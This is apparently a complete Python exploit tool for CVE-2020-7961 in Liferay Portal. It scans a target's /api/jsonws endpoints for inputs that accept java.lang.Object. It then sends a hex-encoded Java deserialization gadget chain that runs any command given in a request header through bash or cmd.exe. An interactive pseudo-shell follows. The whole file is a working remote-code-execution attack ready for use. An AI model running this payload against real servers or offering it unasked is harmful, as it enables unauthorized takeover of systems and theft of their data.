import argparse
import httpx
from bs4 import BeautifulSoup
import trio


'''TODO
- give option to recon or not
- add other exploitation methods: https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html
- once vulnerable input are found, write a .log file with the vulnerable_elements array for that specific url to omit recon next time it's run
- and/or add --context and --endpoint arguments instead
'''


class Logger:
    def __init__(self, verbosity=0, quiet=False):
        self.verbosity = verbosity
        self.quiet = quiet

    def debug(self, message):
        if self.verbosity == 2:
            print("{}[DEBUG]{} {}".format(YELLOW, END, message))

    def verbose(self, message):
        if self.verbosity >= 1:
            print("{}[VERBOSE]{} {}".format(BLUE, END, message))

    def info(self, message):
        if not self.quiet:
            print("{}[*]{} {}".format(BOLD_BLUE, END, message))

    def success(self, message):
        if not self.quiet:
            print("{}[+]{} {}".format(BOLD_GREEN, END, message))

    def warning(self, message):
        if not self.quiet:
            print("{}[-]{} {}".format(BOLD_ORANGE, END, message))

    def error(self, message):
        if not self.quiet:
            print("{}[!]{} {}".format(BOLD_RED, END, message))


def get_options():
    description = "Exploit script for CVE-2020-7961 (developed for unpatched 6.2 GA6, not tested on other versions"
    epilog = ""

    parser = argparse.ArgumentParser(
        description=description,
        epilog=epilog,
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument("-c", "--command", dest="command", action="store",
                        help="command to run on the target server", required=False)
    parser.add_argument("-t", "--target", dest="target", action="store",
                        help="target to attempt liferay RCE on", required=True)
    parser.add_argument("--api-path", dest="api_path", action="store",
                        help="target to attempt liferay RCE on", default="/api/jsonws")
    parser.add_argument("--max-children", dest="max_children", action="store", type=int,
                        help="Maximum children for async requests", default=5)
    parser.add_argument(
        "-v",
        "--verbose",
        dest="verbosity",
        action="count",
        default=0,
        help="verbosity level (-v for verbose, -vv for debug)",
    )
    parser.add_argument(
        "-q",
        "--quiet",
        dest="quiet",
        action="store_true",
        default=False,
        help="show no information at all",
    )

    options = parser.parse_args()

    return options


def find_endpoints_in_context(target, api_path, context_path):
    logger.info(f"Enumerating endpoints for context \"{context_path}\"")
    r = httpx.get(url=target + api_path + "?contextPath=" + context_path)
    s = BeautifulSoup(r.text, "html.parser")
    nb_of_endpoints = len(s.find_all("a", href=True))
    logger.verbose(f"Parsing {nb_of_endpoints} endpoints")
    return s.find_all("a", {"class": "method-name lfr-api-service-result"}, href=True)


async def enumerate_endpoint_inputs(async_limiter, http_client, target, api_path, context_path, endpoint, vulnerable_elements):
    async with async_limiter:
        endpoint_name = endpoint["href"].split("signature=")[1]
        logger.verbose(f"Enumerating endpoint \"{endpoint_name}\"")
        try:
            r = await http_client.get(url=target + api_path + "?contextPath=" + context_path + "&signature=" + endpoint_name)
            s = BeautifulSoup(r.text, "html.parser")
            inputs = s.find_all("div", {"class": "input-append"})
            for input_specs in inputs:
                input_name = input_specs.input["name"]
                input_type = input_specs.span.get_text()
                if input_type == "java.lang.Object":
                    logger.success(f"Found hijackable input \"{input_name}\", in endpoint \"{endpoint_name}\", in context \"{context_path}\"")
                    vulnerable_elements.append({"context": context_path, "endpoint": endpoint_name})
        except httpx.ConnectTimeout:
            logger.warning(f"Timeout error when requesting endpoint \"{endpoint_name}\"")


def find_contexts(target, api_path):
    logger.verbose("Looking for context paths")
    r = httpx.get(url=target + api_path)
    s = BeautifulSoup(r.text, "html.parser")
    context_paths = []
    for context_path in s.find("select", id="contextPath").find_all("option"):
        context_paths.append(context_path["value"])
    logger.success(f"Found context paths: {context_paths}")
    return context_paths


def attack_invoke(target, api_path, vulnerable_elements, payload, payload_type, command):
    logger.info("Attacking method using the /api/jsonws/invoke")
    r = httpx.get(url=target + api_path + "/invoke")
    if "Unable to deserialize object" in r.text:
        logger.success("Target tries to deserialize objects")
        for vulnerable_element in vulnerable_elements:
            r = httpx.get(url=target + api_path + "?contextPath=" + vulnerable_element["context"] + "&signature=" + vulnerable_element["endpoint"])
            s = BeautifulSoup(r.text, 'html.parser')
            service_name = s.find("div", {"class": "lfr-api-method lfr-api-section"}).h2.string
            logger.info(f"Trying service named: {service_name}")
            params = {}
            inputs = s.find_all("div", {"class": "input-append"})
            for input_specs in inputs:
                input_name = input_specs.input["name"]
                input_type = input_specs.span.get_text()
                if input_type == "java.lang.Object":
                    params[input_name + ":" + payload_type] = payload
                else:
                    params[input_name] = "1"
            params["cmd"] = '{"' + service_name + '":{}}'

            result = attack_invoke_execute(target, api_path, params, command)
            if "exception" in result:
                logger.error("Command execution failed, trying next endpoint")
                logger.verbose(result)
            else:
                logger.success("Command execution success, output below:\n" + result)
                pseudo_shell = input("{}[?]{} Do you want a pseudo shell? [Y/n] ".format(BOLD_BLUE, END))
                if not pseudo_shell.lower() == "n":
                    attack_invoke_pseudo_shell(target, api_path, params)
                break
    else:
        logger.warning("Target does not try to deserialize objects, can't attack this way")


def attack_invoke_pseudo_shell(target, api_path, params):
    logger.info("Starting pseudo-shell\n")
    while True:
        cmd = input("{}>{} ".format(BOLD_RED, END))
        if cmd == "exit":
            break
        else:
            print(attack_invoke_execute(target, api_path, params, cmd))


def attack_invoke_execute(target, api_path, params, command):
    headers = {"cmd2": command}
    logger.verbose("Target: " + target + api_path + "/invoke")
    logger.verbose("Headers: " + str(headers))
    logger.verbose("Data: " + str(params))
    r = httpx.post(url=target + api_path + "/invoke", data=params, headers=headers)
    return r.text


async def main():
    logger.info(f"Starting CVE-2020-7961 exploitation on: {options.target}")
    logger.info("Looking for vulnerable endpoints")
    logger.info("Initiating contexts enumeration")
    context_paths = find_contexts(options.target, options.api_path)
    vulnerable_elements = []
    for context_path in context_paths:
        endpoints = find_endpoints_in_context(options.target, options.api_path, context_path)
        async with trio.open_nursery() as nursery:
            for endpoint in endpoints:
                nursery.start_soon(enumerate_endpoint_inputs, async_limiter, http_client, options.target, options.api_path, context_path, endpoint, vulnerable_elements)
    await http_client.aclose()
    logger.info("Moving on to exploitation attempts")
    if not options.command:
        options.command = input("{}[?]{} Command to run on target: ".format(BOLD_BLUE, END))

    payload_type = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
    payload = '''{"userOverridesAsString":"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;"}'''

    attack_invoke(options.target, options.api_path, vulnerable_elements, payload, payload_type, options.command)


if __name__ == "__main__":
    BOLD_GREEN = "\033[1;32m"
    BOLD_BLUE = "\033[1;34m"
    BOLD_WHITE = "\033[1;37m"
    BOLD_RED = "\033[1;31m"
    BOLD_ORANGE = "\033[1;93m"
    END = "\033[0m"
    BLUE = "\033[0;34m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    RED = "\033[0;31m"

    options = get_options()
    logger = Logger(options.verbosity, options.quiet)

    async_limiter = trio.CapacityLimiter(options.max_children)
    http_client = httpx.AsyncClient()

    trio.run(main)
